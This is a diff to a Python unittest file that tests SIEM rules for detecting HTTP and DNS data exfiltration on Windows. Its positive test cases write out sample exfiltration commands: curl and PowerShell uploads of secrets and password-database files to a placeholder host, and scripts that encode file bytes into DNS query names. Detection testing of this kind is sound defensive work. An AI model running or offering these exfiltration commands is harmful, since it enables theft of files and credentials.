@@ -6,6 +6,8 @@ import re
 import unittest
 import xml.etree.ElementTree as ET
 
+from tests.analyze_dns_exfiltration_corpus import ENCODED_LABEL, analyze
+
 RULES = Path(__file__).resolve().parents[1] / "rules"
 
 
@@ -34,6 +36,13 @@ def required_text(rule: ET.Element, tag: str) -> str:
     if value is None:
         raise AssertionError(f"rule {rule.attrib.get('id')} has no {tag}")
     return value
+
+
+def field_pattern(rule: ET.Element, field_name: str) -> str:
+    field = rule.find(f"field[@name='{field_name}']")
+    if field is None or field.text is None:
+        raise AssertionError(f"rule {rule.attrib.get('id')} has no populated field {field_name}")
+    return field.text
 
 
 class RuleHardeningTests(unittest.TestCase):
@@ -94,6 +103,144 @@ class RuleHardeningTests(unittest.TestCase):
         assert image_field is not None and image_field.text is not None
         observed = r"C:\\Users\\ADAM~1.WIL\\AppData\\Local\\Temp\\TunnelBehavior\\relay.exe"
         self.assertIsNotNone(re.search(image_field.text, observed))
+
+    def test_http_curl_upload_grammar_is_broad_but_argument_bound(self) -> None:
+        rules = load_rules("http_exfiltration_detection.xml")
+        generic = re.compile(field_pattern(rules["100530"], "win.eventdata.commandLine"))
+        positives = [
+            r'\"C:\\Windows\\System32\\curl.exe\" --data-binary @C:\\Users\\u\\secrets.txt https://host/upload',
+            r'curl.exe --data-binary="@C:\\Users\\u\\My Files\\archive.zip" https://host/upload',
+            r'curl.exe --upload-file C:\\Temp\\dump.kdbx https://host/upload',
+            r'curl.exe -T "C:\\Temp\\quarterly report.pdf" https://host/upload',
+        ]
+        negatives = [
+            r'curl.exe --data-binary "status=ok" https://host/upload',
+            r'curl.exe --version',
+            r'curl.exe https://host/report.zip',
+            r'curl.exe --upload-file https://host/report.zip',
+            r'curl.exe --upload-file C:\\Temp\\dump.kdbx ftp://ftp.example/upload --next https://host/health',
+        ]
+        for command in positives:
+            self.assertIsNotNone(generic.search(command), command)
+        for command in negatives:
+            self.assertIsNone(generic.search(command), command)
+
+        sensitive = re.compile(field_pattern(rules["100531"], "win.eventdata.commandLine"))
+        self.assertIsNotNone(sensitive.search(positives[0]))
+        self.assertIsNotNone(sensitive.search(positives[2]))
+        self.assertIsNone(sensitive.search(r'curl.exe --upload-file C:\\Temp\\health.json https://host/report.zip'))
+        self.assertIsNone(sensitive.search(r'curl.exe --upload-file C:\\Temp\\health.json https://host/upload --next --upload-file C:\\Temp\\dump.kdbx ftp://ftp.example/upload'))
+
+    def test_http_has_rename_resistant_curl_and_generic_powershell_layers(self) -> None:
+        rules = load_rules("http_exfiltration_detection.xml")
+        metadata = rules["100544"]
+        self.assertEqual(child_text(metadata, "if_sid"), "61603")
+        self.assertIsNotNone(metadata.find("field[@name='win.eventdata.originalFileName']"))
+        names = " ".join(f.attrib.get("name", "") for f in metadata.findall("field"))
+        self.assertNotIn("newProcessName", names)
+        self.assertNotIn("hashes", names)
+
+        ps = re.compile(field_pattern(rules["100532"], "win.eventdata.scriptBlockText"))
+        positives = [
+            'curl.exe --data-binary "@$p" "https://host/upload"',
+            'Invoke-WebRequest -Uri https://host/upload -Method Put -InFile $p',
+            '$wc.UploadFile("https://host/upload", $p)',
+            'Start-BitsTransfer -TransferType Upload -Source $p -Destination https://host/upload',
+            '$content=[Net.Http.StreamContent]::new($stream);$client.PostAsync("https://host/upload",$content)',
+        ]
+        for script in positives:
+            self.assertIsNotNone(ps.search(script), script)
+        self.assertIsNone(ps.search('Invoke-WebRequest -Uri https://host/health -Method Get'))
+        self.assertIsNone(ps.search('curl.exe --data-binary "status=ok" https://host/telemetry'))
+        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload --next https://host/health'))
+        self.assertIsNone(ps.search('$wc.UploadFile("ftp://ftp.example/upload",$p);Invoke-WebRequest -Uri https://host/health -Method Get'))
+        self.assertIsNone(ps.search('curl.exe --upload-file $p ftp://ftp.example/upload;Invoke-WebRequest -Uri https://host/health -Method Get'))
+        self.assertIsNone(ps.search("curl.exe --upload-file $p ftp://ftp.example/upload;$wc.DownloadString('https://host/health')"))
+        self.assertIsNone(ps.search("$p=Join-Path $env:TEMP 'controlled.txt';Set-Content $p 'password=CONTROLLED';curl.exe --upload-file $p ftp://ftp.example/upload;Invoke-WebRequest -Uri https://host/health -Method Get"))
+
+        high = rules["100545"]
+        self.assertEqual(child_text(high, "if_sid"), "100532")
+        self.assertGreater(int(high.attrib["level"]), int(rules["100532"].attrib["level"]))
+
+    def test_dns_encoded_label_and_burst_layers_generalize_transport(self) -> None:
+        rules = load_rules("dns_exfiltration_detection.xml")
+        encoded = re.compile(field_pattern(rules["100533"], "win.eventdata.queryName"))
+        self.assertIsNotNone(encoded.search("s.0.8.436c617373696669636174696f6e3d434f4e464944454e54.example"))
+        self.assertIsNotNone(encoded.search("mfrggzdfmztwq2lkj5xw42lomv4gc3lqn5xw4zzomnxw2zls.example"))
+        self.assertIsNotNone(encoded.search(("a" * 48) + ".example"))
+        self.assertIsNone(encoded.search("dc01.simulation.local"))
+
+        framed = re.compile(field_pattern(rules["100534"], "win.eventdata.queryName"))
+        self.assertIsNotNone(framed.search("sess.1.5." + ("a" * 48) + ".example"))
+        self.assertIsNone(framed.search("sess.1.5.normal." + ("a" * 48) + ".example"))
+
+        burst = rules["100546"]
+        self.assertEqual(child_text(burst, "if_matched_sid"), "100533")
+        self.assertEqual(burst.attrib.get("frequency"), "5")
+        self.assertEqual(burst.attrib.get("timeframe"), "15")
+        self.assertEqual(child_text(burst, "same_field"), "win.system.processID")
+
+    def test_dns_powershell_behavior_supports_hex_and_base64_dns_apis(self) -> None:
+        rules = load_rules("dns_exfiltration_detection.xml")
+        fields = [f.text or "" for f in rules["100535"].findall("field[@name='win.eventdata.scriptBlockText']")]
+        self.assertEqual(len(fields), 3)
+        patterns = [re.compile(x) for x in fields]
+        positives = [
+            "$b=[IO.File]::ReadAllBytes($p);$h=-join($b|%{$_.ToString('x2')});$c=$h.Substring(0,48);Resolve-DnsName -Name \"$c.x.lab\" -Server $s",
+            "$b=Get-Content $p -Encoding Byte;$e=[Convert]::ToBase64String($b);$c=$e.Substring(0,48);[System.Net.Dns]::GetHostAddresses(\"$c.x.lab\")",
+        ]
+        for script in positives:
+            self.assertTrue(all(p.search(script) for p in patterns), script)
+        negatives = [
+            "Resolve-DnsName dc01.simulation.local -Type A",
+            "$b=[IO.File]::ReadAllBytes($p);$e=[Convert]::ToBase64String($b);Set-Content backup.txt $e;Resolve-DnsName api.example",
+        ]
+        for script in negatives:
+            self.assertFalse(all(p.search(script) for p in patterns), script)
+
+    def test_dns_corpus_analyzer_measures_same_process_sliding_window(self) -> None:
+        self.assertEqual(
+            ENCODED_LABEL.pattern,
+            field_pattern(load_rules("dns_exfiltration_detection.xml")["100533"], "win.eventdata.queryName"),
+        )
+
+        def record(query: str, second: int, process_id: str = "42") -> dict:
+            return {
+                "data": {
+                    "win": {
+                        "system": {
+                            "channel": "Microsoft-Windows-DNS-Client/Operational",
+                            "eventID": "3006",
+                            "processID": process_id,
+                            "systemTime": f"2026-08-06T12:00:{second:02d}.1234567Z",
+                        },
+                        "eventdata": {"queryName": query},
+                    }
+                }
+            }
+
+        encoded = ("a" * 48) + ".example"
+        records = [record("dc01.simulation.local", 0)]
+        records.extend(record(encoded, second) for second in range(1, 6))
+        records.extend(record(encoded, second, "99") for second in (1, 20))
+        result = analyze(records, window_seconds=15)
+        self.assertEqual(result["dns_event_count"], 8)
+        self.assertEqual(result["candidate_event_count"], 7)
+        self.assertEqual(result["process_bursts"][0]["max_in_window"], 5)
+
+    def test_exfiltration_rule_ids_are_mapped_in_playbooks_and_dashboard(self) -> None:
+        root = RULES.parent
+        dashboard = (root / "dashboard_queries.md").read_text(encoding="utf-8")
+        families = {
+            "http_exfiltration_detection.xml": ("http_exfiltration_cmd.md", {"100530", "100531", "100532", "100544", "100545"}),
+            "dns_exfiltration_detection.xml": ("dns_exfiltration_cmd.md", {"100533", "100534", "100535", "100546"}),
+        }
+        for xml_name, (playbook_name, expected) in families.items():
+            self.assertEqual(set(load_rules(xml_name)), expected)
+            playbook = (root / "tests" / playbook_name).read_text(encoding="utf-8")
+            for rule_id in expected:
+                self.assertIn(rule_id, playbook)
+                self.assertIn(rule_id, dashboard)
 
 
 if __name__ == "__main__":
